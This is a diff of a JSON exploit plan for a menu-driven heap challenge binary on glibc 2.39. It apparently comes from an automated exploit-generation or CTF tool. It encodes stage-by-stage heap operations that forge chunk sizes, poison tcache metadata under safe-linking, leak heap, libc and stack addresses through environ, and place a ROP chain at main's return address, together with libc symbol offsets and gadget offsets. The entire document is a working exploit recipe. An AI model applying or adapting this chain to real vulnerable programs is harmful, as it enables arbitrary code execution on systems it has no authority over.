@@ -1,21 +1,96 @@
 {
   "stages": [
     {
-      "name": "leak_heap",
+      "name": "leak_heap_libc",
       "ir": [
         {
           "op": "ALLOC",
-          "tag": "h0",
+          "tag": "c0",
+          "idx": 0,
           "size": 48,
-          "data_expr": "b'H' * 8"
+          "data_expr": "b'X' * 8"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "c1",
+          "idx": 1,
+          "size": 48,
+          "data_expr": "b'X' * 8"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "c2",
+          "idx": 2,
+          "size": 48,
+          "data_expr": "b'X' * 8"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "c3",
+          "idx": 3,
+          "size": 48,
+          "data_expr": "b'X' * 8"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "c4",
+          "idx": 4,
+          "size": 48,
+          "data_expr": "b'X' * 8"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "c5",
+          "idx": 5,
+          "size": 48,
+          "data_expr": "b'X' * 8"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "c6",
+          "idx": 6,
+          "size": 48,
+          "data_expr": "b'X' * 8"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "c7",
+          "idx": 7,
+          "size": 48,
+          "data_expr": "b'X' * 8"
+        },
+        {
+          "op": "EDIT",
+          "tag": "c2",
+          "idx": 2,
+          "data_expr": "p64(0) + p64(0xC1)"
+        },
+        {
+          "op": "EDIT",
+          "tag": "c5",
+          "idx": 5,
+          "data_expr": "p64(0) + p64(0x41)"
+        },
+        {
+          "op": "EDIT",
+          "tag": "c6",
+          "idx": 6,
+          "data_expr": "p64(0) + p64(0x21)"
         },
         {
           "op": "FREE",
-          "tag": "h0"
+          "tag": "c0",
+          "idx": 0
+        },
+        {
+          "op": "FREE",
+          "tag": "c1",
+          "idx": 1
         },
         {
           "op": "VIEW",
-          "tag": "h0",
+          "tag": "c0",
+          "idx": 0,
           "save_as": "xor_key",
           "note": "read_first_8_bytes_fd_xor"
         },
@@ -23,65 +98,133 @@
           "op": "CALC",
           "var": "heap_base",
           "expr": "xor_key << 12"
-        }
-      ]
-    },
-    {
-      "name": "leak_libc_metadata",
-      "ir": [
-        {
-          "op": "CALC",
-          "var": "tcache_struct",
-          "expr": "heap_base + 0x10"
         },
         {
           "op": "EDIT",
-          "tag": "h0",
-          "data_expr": "p64(tcache_struct ^ (heap_base + 0x2a0 >> 12))"
+          "tag": "c1",
+          "idx": 1,
+          "data_expr": "p64((heap_base + 0x10) ^ ((heap_base + 0x2e0) >> 12))"
         },
         {
           "op": "ALLOC",
-          "tag": "h1",
+          "tag": "p2_head",
+          "idx": 8,
           "size": 48,
           "data_expr": "b'P' * 8"
         },
         {
           "op": "ALLOC",
-          "tag": "tcache_chunk",
+          "tag": "p2_struct",
+          "idx": 9,
           "size": 48,
-          "data_expr": "b'T' * 8"
-        },
-        {
-          "op": "ALLOC",
-          "tag": "ov",
-          "size": 48,
-          "data_expr": "b'V' * 8"
-        },
-        {
-          "op": "ALLOC",
-          "tag": "guard",
-          "size": 48,
-          "data_expr": "b'G' * 8"
-        },
-        {
-          "op": "EDIT",
-          "tag": "tcache_chunk",
-          "data_expr": "bytes([0, 0, 0, 0, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])"
+          "data_expr": "b'\\x00' * 4 + p16(2) + p16(1) + b'\\x00' * 12 + p16(7) + b'\\x00' * 26"
         },
         {
           "op": "FREE",
-          "tag": "ov"
+          "tag": "c7",
+          "idx": 7
+        },
+        {
+          "op": "FREE",
+          "tag": "c3",
+          "idx": 3
+        },
+        {
+          "op": "EDIT",
+          "tag": "c7",
+          "idx": 7,
+          "data_expr": "p64((heap_base + 0xA0) ^ ((heap_base + 0x460) >> 12))"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "c8",
+          "idx": 10,
+          "size": 48,
+          "data_expr": "b'Q' * 8"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "c9",
+          "idx": 11,
+          "size": 48,
+          "data_expr": "b'X' * 8"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "c10",
+          "idx": 12,
+          "size": 48,
+          "data_expr": "p64(heap_base + 0x330)"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "c11",
+          "idx": 13,
+          "size": 48,
+          "data_expr": "b'\\x00' * 8"
+        },
+        {
+          "op": "FREE",
+          "tag": "c11",
+          "idx": 13
         },
         {
           "op": "VIEW",
-          "tag": "ov",
+          "tag": "c11",
+          "idx": 13,
           "save_as": "libc_leak",
           "note": "read_first_8_bytes"
         },
         {
           "op": "CALC",
+          "var": "_environ_offset",
+          "expr": "libc.symbols['environ']"
+        },
+        {
+          "op": "CALC",
           "var": "libc.address",
-          "expr": "libc_leak - 0x21ace0"
+          "expr": "libc_leak - 0x203b20"
+        }
+      ]
+    },
+    {
+      "name": "leak_stack",
+      "ir": [
+        {
+          "op": "CALC",
+          "var": "_environ_target",
+          "expr": "libc.address + _environ_offset - 0x18"
+        },
+        {
+          "op": "EDIT",
+          "tag": "p2_struct",
+          "idx": 9,
+          "data_expr": "b'\\x00' * 4 + p16(1) + p16(1) + b'\\x00' * 14 + p16(7) + b'\\x00' * 24"
+        },
+        {
+          "op": "EDIT",
+          "tag": "c10",
+          "idx": 12,
+          "data_expr": "p64(_environ_target)"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "env_chunk",
+          "idx": 14,
+          "size": 48,
+          "data_expr": "b'E'"
+        },
+        {
+          "op": "VIEW",
+          "tag": "env_chunk",
+          "idx": 14,
+          "save_as": "stack_leak",
+          "note": "skip_first_8"
+        },
+        {
+          "op": "CALC",
+          "var": "main_ret_addr",
+          "expr": "stack_leak - 0x130"
         }
       ]
     },
@@ -89,77 +232,53 @@
       "name": "rop_chain",
       "ir": [
         {
-          "op": "CALC",
-          "var": "_environ_ptr",
-          "expr": "libc.symbols['environ']"
-        },
-        {
-          "op": "CALC",
-          "var": "target_environ",
-          "expr": "_environ_ptr - 0x10"
+          "op": "EDIT",
+          "tag": "p2_struct",
+          "idx": 9,
+          "data_expr": "b'\\x00' * 4 + p16(1) + p16(1) + b'\\x00' * 14 + p16(7) + b'\\x00' * 24"
         },
         {
           "op": "EDIT",
-          "tag": "tcache_chunk",
-          "note": "set_tcache_entry:bin=2,addr=target_environ"
-        },
-        {
-          "op": "ALLOC",
-          "tag": "env_chunk",
-          "size": 48,
-          "data_expr": "b'E'"
-        },
-        {
-          "op": "VIEW",
-          "tag": "env_chunk",
-          "save_as": "stack_leak",
-          "note": "skip_first_8"
-        },
-        {
-          "op": "CALC",
-          "var": "main_ret_addr",
-          "expr": "stack_leak - 0x120"
-        },
-        {
-          "op": "EDIT",
-          "tag": "tcache_chunk",
-          "note": "set_tcache_entry:bin=2,addr=main_ret_addr"
+          "tag": "c10",
+          "idx": 12,
+          "data_expr": "p64(main_ret_addr - 8)"
         },
         {
           "op": "ALLOC_ROP",
-          "tag": "rop_chunk",
+          "tag": "rop_target",
+          "idx": 15,
           "size": 48
         }
       ]
     }
   ],
   "metadata": {
-    "strategy": "tcache_metadata_poisoning",
-    "max_slots": 5,
+    "strategy": "tcache_poison_stack",
+    "max_slots": 10,
     "alloc_choice": "1",
     "free_choice": "4",
-    "view_choice": "3",
-    "edit_choice": "2",
-    "exit_choice": "5",
+    "view_choice": "2",
+    "edit_choice": "3",
+    "exit_choice": "0",
     "has_idx": true,
     "has_size": false,
     "data_param_index": 1,
     "needs_size": false,
     "menu_prompt": "b'> '",
     "libc_offsets": {
-      "system": 331120,
-      "__free_hook": 2233512,
-      "__malloc_hook": 2233504,
-      "main_arena": 2206848,
-      "__environ": 2236928,
-      "_IO_2_1_stdout_": 2209664
+      "system": 362320,
+      "__free_hook": 2138440,
+      "__malloc_hook": 2138432,
+      "__environ": 2141528,
+      "_IO_2_1_stdout_": 2115008,
+      "main_arena": 2112192
     },
     "one_gadgets": [],
-    "pop_rdi": 173029,
-    "ret": 168249,
+    "pop_rdi": 1111899,
+    "ret": 165935,
     "index_reuse": false,
     "allocated_size": "0x40",
-    "glibc_version": "2.35",
+    "glibc_version": "2.39",
     "has_safe_linking": true,
     "has_hooks": true,
     "binary_security": {
@@ -168,8 +287,6 @@
       "nx": true,
       "canary": false,
       "cet": false
-    },
-    "technique_id": "tcache_metadata_poisoning",
-    "source": "tcache_metadata_poisoning"
+    }
   }
 }
